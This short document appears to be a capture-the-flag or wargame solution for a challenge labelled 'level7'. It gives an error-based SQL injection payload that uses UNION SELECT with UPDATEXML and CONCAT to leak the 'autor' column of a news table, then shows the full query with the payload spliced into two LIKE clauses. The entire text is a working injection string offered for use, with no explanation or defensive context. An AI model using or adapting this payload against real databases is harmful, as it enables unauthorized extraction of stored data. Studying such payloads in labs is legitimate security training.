-- injection
') UNION SELECT UPDATEXML(1,CONCAT(0x7e,(SELECT autor FROM level7_news LIMIT 1)),0) OR ('

-- whole query
SELECT news.*,text.text,text.title FROM level7_news news, level7_texts text WHERE text.id = news.id AND (text.text LIKE '%') UNION SELECT UPDATEXML(1,CONCAT(0x7e,(SELECT autor FROM level7_news LIMIT 1)),0) OR ('%' OR text.title LIKE '%') UNION SELECT UPDATEXML(1,CONCAT(0x7e,(SELECT autor FROM level7_news LIMIT 1)),0) OR ('%')


